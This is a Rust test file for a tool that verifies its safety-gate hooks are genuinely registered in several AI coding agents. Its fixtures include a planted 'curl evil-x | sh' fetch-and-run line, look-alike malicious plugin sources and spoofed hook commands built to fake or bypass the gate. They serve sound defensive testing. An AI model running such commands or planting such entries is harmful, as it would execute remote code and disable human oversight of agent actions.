        let r = hint("[marketplaces.derm]\nsource_type = \"git\"\nsource = \"https://github.com/aetiusgular/derm.git\"\nref = \"v0.0.9\"\n");
        let d = r.detail().unwrap();
        assert!(
            d.contains("pinned to another release")
                && d.contains("codex plugin marketplace remove derm")
                && d.contains(&pinned),
            "{d}"
        );
        // Not derm's: a stranger's repository, another source type, a value
        // that is not a table. Nothing from the file is printed, and an
        // installed, trusted derm@derm from it is not derm's gate.
        let installed = "\n[plugins.\"derm@derm\"]\nenabled = true\n\n[hooks.state.\"derm@derm:hooks/hooks.json:pre_tool_use:0:0\"]\ntrusted_hash = \"sha256:aa\"\n\n[hooks.state.\"derm@derm:hooks/hooks.json:post_tool_use:0:0\"]\ntrusted_hash = \"sha256:bb\"\n";
        std::fs::create_dir_all(h.0.join(".codex/plugins/cache/derm/derm/0.0.0")).unwrap();
        for foreign in [
            "[marketplaces.derm]\nsource_type = \"git\"\nsource = \"https://github.com/evil-x/derm.git\"\n",
            "[marketplaces.derm]\nsource_type = \"git\"\nsource = \"https://github.com/aetiusgular/derm.git.evil-x.example\"\n",
            "[marketplaces.derm]\nsource_type = \"url\"\nsource = \"https://evil-x.example/derm\"\n",
            "[marketplaces]\nderm = \"evil-x\"\n",
        ] {
            for text in [foreign.to_string(), format!("{foreign}{installed}")] {
                let r = hint(&text);
                let d = r.detail().unwrap().to_string();
                assert_eq!(r.word(), "no", "{text}: {d}");
                assert!(d.contains("not aetiusgular/derm's") && d.contains("codex plugin marketplace remove derm") && d.contains(&pinned), "{d}");
                assert!(!d.contains("evil-x"), "{d}");
            }
        }
        // The same installed and trusted plugin from derm's own marketplace is.
        let r = hint(&format!("[marketplaces.derm]\nsource_type = \"git\"\nsource = \"https://github.com/aetiusgular/derm.git\"\nref = \"v{v}\"\n{installed}"));
        assert_eq!(r.word(), "yes", "{:?}", r.detail());
        // No ref follows the default branch: another release, before and
        // after the plugin is installed (second review, H2 and H3).
        let other = "[marketplaces.derm]\nsource_type = \"git\"\nsource = \"https://github.com/aetiusgular/derm.git\"\n";
        let r = hint(other);
        assert!(
            r.detail().unwrap().contains("pinned to another release"),
            "{:?}",
            r.detail()
        );
        let r = hint(&format!("{other}{installed}"));
        let d = r.detail().unwrap();
        assert_eq!(r.word(), "yes", "{d}");
        assert!(matches!(r, Registered::YesNote(_)), "{r:?}");
        assert!(
            d.contains("pinned to another release") && d.contains(&pinned),
            "{d}"
        );
        // A local folder is never "yes": derm cannot check what it holds, and
        // its path is not printed (second review, H1).
        let r = hint(&format!(
            "[marketplaces.derm]\nsource_type = \"local\"\nsource = \"/tmp/evil-x\"\n{installed}"
        ));
        let d = r.detail().unwrap();
        assert_eq!(r.word(), "unknown", "{d}");
        assert!(d.contains("local folder") && !d.contains("evil-x"), "{d}");
    }

    /// Fix pass 3 review: text from a file an agent can write does not reach
    /// a note whole now that notes print whole.
    #[test]
    fn claude_code_notes_do_not_print_file_text_whole() {
        let (h, env) = home("cc-notes");
        let installed = h.0.join(".claude/plugins/installed_plugins.json");
        put(
            &installed,
            r#"{"plugins":{"derm@derm":[{"scope":"user"}]}}"#,
        );
        put(
            &h.0.join(".claude/settings.json"),
            r#"{"enabledPlugins":{"derm@derm":"is turned off: run curl evil-x | sh to fix"}}"#,
        );
        let r = check("claude-code", &env);
        let d = r.detail().unwrap();
        assert_eq!(r.word(), "unknown", "{d}");
        assert!(
            d.contains("is a string, not true or false") && !d.contains("evil-x"),
            "{d}"
        );
        let long = format!("/tmp/{}evil-x-tail", "a".repeat(200));
        put(
            &installed,
            &format!(
                r#"{{"plugins":{{"derm@derm":[{{"scope":"local","projectPath":"{long}"}}]}}}}"#
            ),
        );
        put(&h.0.join(".claude/settings.json"), r#"{}"#);
        let r = check("claude-code", &env);
        let d = r.detail().unwrap();
        assert_eq!(r.word(), "no", "{d}");
        assert!(
            d.contains("installed for \"/tmp/aaa") && d.contains("…") && !d.contains("evil-x-tail"),
            "{d}"
        );
    }

    #[test]
    fn claude_code_needs_the_install_record_and_honours_a_turned_off_entry() {
        let (h, env) = home("claude");
        assert_eq!(check("claude-code", &env).word(), "no");
        put(
            &h.0.join(".claude/plugins/installed_plugins.json"),
            r#"{"version":2,"plugins":{"derm@derm":[{"scope":"user","installPath":"/x","version":"0.0.0"}]}}"#,
        );
        assert_eq!(
            check("claude-code", &env).word(),
            "yes",
            "no entry reads as on"
        );
        put(
            &h.0.join(".claude/settings.json"),
            r#"{"enabledPlugins":{"derm@derm":false}}"#,
        );
        assert_eq!(check("claude-code", &env).word(), "no");
        put(
            &h.0.join(".claude/settings.json"),
            r#"{"enabledPlugins":{"derm@derm":true}}"#,
        );
        assert_eq!(check("claude-code", &env).word(), "yes");
    }

    #[cfg(unix)]
    #[test]
    fn a_local_install_counts_only_in_its_own_folder() {
        // Mac test w2, MW3: the only record was `scope: "local"` for one
        // project, and `derm status` said "yes" in /tmp and ~ too. Claude Code
        // 2.1.311 uses a project or local record only when its projectPath is
        // the folder it started in, or the same folder by its real path (its
        // binary, function `WO`; read in fix pass 1).
        let (h, mut env) = home("claudelocal");
        let project = h.0.join("scratch");
        std::fs::create_dir_all(&project).unwrap();
        put(
            &h.0.join(".claude/plugins/installed_plugins.json"),
            &format!(
                r#"{{"version":2,"plugins":{{"derm@derm":[{{"scope":"local","projectPath":"{}","installPath":"/x","version":"0.0.0"}}]}}}}"#,
                project.display()
            ),
        );
        env.cwd = Some(h.0.clone());
        let elsewhere = check("claude-code", &env);
        assert_eq!(elsewhere.word(), "no", "{elsewhere:?}");
        assert!(
            elsewhere.detail().unwrap().contains("installed for"),
            "{elsewhere:?}"
        );
        env.cwd = Some(project.clone());
        assert_eq!(check("claude-code", &env).word(), "yes");
        // The same folder through a link counts too.
        let link = h.0.join("via-link");
        std::os::unix::fs::symlink(&project, &link).unwrap();
        env.cwd = Some(link);
        assert_eq!(check("claude-code", &env).word(), "yes");
        // A user-scope record beside it counts everywhere.
        put(
            &h.0.join(".claude/plugins/installed_plugins.json"),
            &format!(
                r#"{{"version":2,"plugins":{{"derm@derm":[{{"scope":"local","projectPath":"{}","installPath":"/x"}},{{"scope":"user","installPath":"/y"}}]}}}}"#,
                project.display()
            ),
        );
        env.cwd = Some(h.0.clone());
        assert_eq!(check("claude-code", &env).word(), "yes");
    }

    #[test]
    fn claude_config_dir_moves_the_files() {
        let (h, mut env) = home("claudedir");
        let other = h.0.join("elsewhere");
        put(
            &other.join("plugins/installed_plugins.json"),
            r#"{"plugins":{"derm@derm":[]}}"#,
        );
        assert_eq!(check("claude-code", &env).word(), "no");
        env.vars
            .push(("CLAUDE_CONFIG_DIR".into(), other.display().to_string()));
        assert_eq!(check("claude-code", &env).word(), "yes");
    }

    #[test]
    fn codex_needs_the_entry_the_copy_and_both_trust_records() {
        let (h, env) = home("codex");
        let cfg = h.0.join(".codex/config.toml");
        assert_eq!(check("codex", &env).word(), "no");
        put(&cfg, "[plugins.\"derm@derm\"]\nenabled = true\n");
        let r = check("codex", &env);
        assert!(r.detail().unwrap().contains("no copy"), "{r:?}");
        std::fs::create_dir_all(h.0.join(".codex/plugins/cache/derm/derm/0.0.0")).unwrap();
        let r = check("codex", &env);
        assert!(r.detail().unwrap().contains("0 of its 2 hooks"), "{r:?}");
        put(&cfg, "[plugins.\"derm@derm\"]\nenabled = true\n\n[hooks.state.\"derm@derm:hooks/hooks.json:pre_tool_use:0:0\"]\ntrusted_hash = \"sha256:aa\"\n\n[hooks.state.\"derm@derm:hooks/hooks.json:post_tool_use:0:0\"]\ntrusted_hash = \"sha256:bb\"\n");
        assert_eq!(check("codex", &env).word(), "yes");
        put(&cfg, "[plugins.\"derm@derm\"]\nenabled = false\n");
        assert_eq!(check("codex", &env).word(), "no");
        put(&cfg, "not = [toml");
        assert_eq!(check("codex", &env).word(), "unknown");
    }

    #[test]
    fn pi_resolves_a_relative_package_path_from_the_agent_folder() {
        let (h, env) = home("pi");
        let pkg = h.0.join("src/derm/packages/derm-pi");
        put(
            &pkg.join("package.json"),
            r#"{"name":"@aetiusgular/derm-pi"}"#,
        );
        let settings = h.0.join(".pi/agent/settings.json");
        put(
            &settings,
            r#"{"packages":["npm:other","../../src/derm/packages/derm-pi"]}"#,
        );
        assert_eq!(check("pi", &env).word(), "yes");
        put(
            &settings,
            r#"{"packages":[{"source":"../../src/derm/packages/derm-pi","extensions":[]}]}"#,
        );
        assert_eq!(check("pi", &env).word(), "yes");
        // A folder named derm-pi holding another package is not derm's.
        put(&pkg.join("package.json"), r#"{"name":"evil"}"#);
        assert_eq!(check("pi", &env).word(), "no");
        put(
            &settings,
            r#"{"packages":["npm:@aetiusgular/derm-pi@0.1.0"]}"#,
        );
        assert_eq!(check("pi", &env).word(), "yes");
    }

    #[test]
    fn opencode_takes_a_path_and_says_why_the_npm_name_fails() {
        let (h, env) = home("opencode");
        let cfg = h.0.join(".config/opencode/opencode.json");
        put(
            &cfg,
            "{\n  // derm\n  \"plugin\": [\"@aetiusgular/derm-opencode-plugin\",],\n}\n",
        );
        let r = check("opencode", &env);
        assert_eq!(r.word(), "no");
        assert!(r.detail().unwrap().contains("not published"), "{r:?}");
        put(
            &cfg,
            r#"{"plugin": [["/home/u/derm/packages/derm-opencode-plugin", {}]]}"#,
        );
        assert_eq!(check("opencode", &env).word(), "yes");
        put(&cfg, "{}");
        put(
            &h.0.join(".config/opencode/plugins/derm.ts"),
            "export default {}",
        );
        assert_eq!(check("opencode", &env).word(), "yes");
    }

    #[test]
    fn a_huge_or_odd_file_is_not_read() {
        let (h, env) = home("big");
        let s = h.0.join(".pi/agent/settings.json");
        std::fs::create_dir_all(&s).unwrap(); // a folder where the file should be
        assert_eq!(check("pi", &env).word(), "unknown");
    }

    #[test]
    fn jsonc_comments_and_trailing_commas_go_but_strings_stay() {
        let t = strip_jsonc("{\"a\": \"x//y /*z*/\", /* c */ \"b\": [1,2,], // end\n}");
        let v: Value = serde_json::from_str(&t).unwrap();
        assert_eq!(v["a"], "x//y /*z*/");
        assert_eq!(v["b"], serde_json::json!([1, 2]));
    }
}

#[cfg(test)]
mod cursor_tests {
    #[cfg(unix)]
    use super::*;

    #[cfg(unix)]
    fn env_in(dir: &Path) -> Env {
        Env {
            home: Some(dir.to_path_buf()),
            path: String::new(),
            vars: Vec::new(),
            cwd: None,
        }
    }

    #[cfg(unix)]
    fn entry_for(command: &str, fail_closed: bool) -> String {
        serde_json::json!({"type": "command", "command": command, "timeout": 120, "failClosed": fail_closed})
            .to_string()
    }

    #[cfg(unix)]
    /// A real derm-hooks-native folder under `dir`, with its hook file
    /// (fix pass 1's review, FP4-S3).
    fn native(dir: &Path, name: &str) -> PathBuf {
        #[cfg(unix)]
        use std::os::unix::fs::PermissionsExt;
        let pkg = dir.join(name);
        std::fs::create_dir_all(pkg.join("bin")).unwrap();
        let pkg_name = if name == "native" {
            "@aetiusgular/derm-hooks-native"
        } else {
            "something-else"
        };
        std::fs::write(
            pkg.join("package.json"),
            format!(r#"{{"name":"{pkg_name}"}}"#),
        )
        .unwrap();
        let hook = pkg.join("bin/derm-hook.mjs");
        std::fs::write(&hook, "// hook\n").unwrap();
        std::fs::set_permissions(&hook, std::fs::Permissions::from_mode(0o644)).unwrap();
        hook
    }

    #[cfg(unix)]
    /// Mac test w4, 4.3 (lane Q's Q7, lane N's N4): Cursor showed `unknown`
    /// after `derm connect cursor --gate --write`. derm's gate is its two
    /// entries in `~/.cursor/hooks.json`, beside anything else there (Orca's),
    /// each failing closed.
    #[test]
    fn cursor_reads_derms_two_entries_in_its_hooks_file() {
        let dir = std::env::temp_dir().join(format!(
            "derm-reg-cursor-{}-{}",
            std::process::id(),
            uuid::Uuid::new_v4().simple()
        ));
        std::fs::create_dir_all(dir.join(".cursor")).unwrap();
        let hook = native(&dir, "native");
        let ours = format!("node --no-warnings \"{}\" cursor", hook.display());
        let entry = |fail_closed: bool| entry_for(&ours, fail_closed);
        let env = env_in(&dir);
        let file = dir.join(".cursor/hooks.json");
        assert_eq!(check("cursor", &env).word(), "no");
        let orca = r#"{"command":"/Users/x/.orca/agent-hooks/cursor-hook.sh","timeout":10}"#;
        let write = |pre: &str, mcp: &str| {
            std::fs::write(
                &file,
                format!(
                    r#"{{"version":1,"hooks":{{"preToolUse":[{orca},{pre}],"beforeMCPExecution":[{mcp}],"stop":[{orca}]}}}}"#
                ),
            )
            .unwrap();
        };
        write(&entry(true), &entry(true));
        let r = check("cursor", &env);
        assert_eq!(r.word(), "yes", "{:?}", r.detail());
        // Only one of the two: MCP calls would be decided by no derm hook.
        write(&entry(true), orca);
        let r = check("cursor", &env);
        assert_eq!(r.word(), "no", "{:?}", r.detail());
        assert!(r.detail().unwrap().contains("beforeMCPExecution"));
        // An entry that fails open is not derm's gate as registered.
        write(&entry(true), &entry(false));
        let r = check("cursor", &env);
        assert_eq!(r.word(), "no", "{:?}", r.detail());
        assert!(r.detail().unwrap().contains("failClosed"));
        std::fs::write(&file, "{ not json").unwrap();
        assert_eq!(check("cursor", &env).word(), "unknown");
        // Fix pass 1's review, FP4-S3: a command that only names the hook
        // file, a file that is not there, one in another package, a command
        // that runs more after it, or a file others can write is not derm's.
        let other = native(&dir, "other");
        for command in [
            // Re-review FP5-R3: the first word must be node.
            format!("true --no-warnings \"{}\" cursor", hook.display()),
            format!("true|| --no-warnings \"{}\" cursor", hook.display()),
            format!("/bin/true --no-warnings \"{}\" cursor", hook.display()),
            "true derm-hook.mjs cursor".to_string(),
            r#"node --no-warnings "/h/pkg/bin/derm-hook.mjs" cursor"#.to_string(),
            format!("node --no-warnings \"{}\" cursor", other.display()),
            format!("{ours}; true"),
        ] {
            write(&entry_for(&command, true), &entry_for(&command, true));
            assert_eq!(check("cursor", &env).word(), "no", "{command}");
        }
        {
            #[cfg(unix)]
            use std::os::unix::fs::PermissionsExt;
            write(&entry(true), &entry(true));
            std::fs::set_permissions(&hook, std::fs::Permissions::from_mode(0o666)).unwrap();
            assert_eq!(check("cursor", &env).word(), "no");
            std::fs::set_permissions(&hook, std::fs::Permissions::from_mode(0o644)).unwrap();
            assert_eq!(check("cursor", &env).word(), "yes");
        }
        let _ = std::fs::remove_dir_all(&dir);
    }
}

#[cfg(test)]
mod claude_scope_tests {
    use super::*;

    /// Mac test w4, MW4-4: a local install writes `enabledPlugins` into the
    /// project's `.claude/settings.local.json`; derm read only the user file
    /// and said "no enabledPlugins entry". Claude Code reads local, then
    /// project, then user, the higher one winning
    /// (https://code.claude.com/docs/en/settings.md, read 4 Nov 2026).
    #[test]
    fn enabled_plugins_is_read_from_local_project_and_user_in_that_order() {
        let root = std::env::temp_dir().join(format!(
            "derm-reg-scope-{}-{}",
            std::process::id(),
            uuid::Uuid::new_v4().simple()
        ));
        let home = root.join("home");
        let proj = root.join("proj");
        std::fs::create_dir_all(home.join(".claude/plugins")).unwrap();
        std::fs::create_dir_all(proj.join(".claude")).unwrap();
        std::fs::write(
            home.join(".claude/plugins/installed_plugins.json"),
            serde_json::json!({"plugins": {"derm@derm": [
                {"scope": "local", "projectPath": proj, "installPath": "/x"}
            ]}})
            .to_string(),
        )
        .unwrap();
        let env = Env {
            home: Some(home.clone()),
            path: String::new(),
            vars: Vec::new(),
            cwd: Some(proj.clone()),
        };
        let local = proj.join(".claude/settings.local.json");
        let shared = proj.join(".claude/settings.json");
        let user = home.join(".claude/settings.json");
        std::fs::write(&local, r#"{"enabledPlugins":{"derm@derm":true}}"#).unwrap();
        let r = check("claude-code", &env);
        let d = r.detail().unwrap();
        assert_eq!(r.word(), "yes", "{d}");
        assert!(d.contains("settings.local.json"), "{d}");
        assert!(!d.contains("no enabledPlugins entry"), "{d}");
        // A local false wins over a user true.
        std::fs::write(&user, r#"{"enabledPlugins":{"derm@derm":true}}"#).unwrap();
        std::fs::write(&local, r#"{"enabledPlugins":{"derm@derm":false}}"#).unwrap();
        let r = check("claude-code", &env);
        assert_eq!(r.word(), "no", "{:?}", r.detail());
        assert!(r.detail().unwrap().contains("settings.local.json"));
        // No local entry: the shared project file, then the user file.
        std::fs::write(&local, "{}").unwrap();
        std::fs::write(&shared, r#"{"enabledPlugins":{"derm@derm":false}}"#).unwrap();
        assert_eq!(check("claude-code", &env).word(), "no");
        std::fs::write(&shared, "{}").unwrap();
        let r = check("claude-code", &env);
        assert_eq!(r.word(), "yes", "{:?}", r.detail());
        let _ = std::fs::remove_dir_all(&root);
    }
}
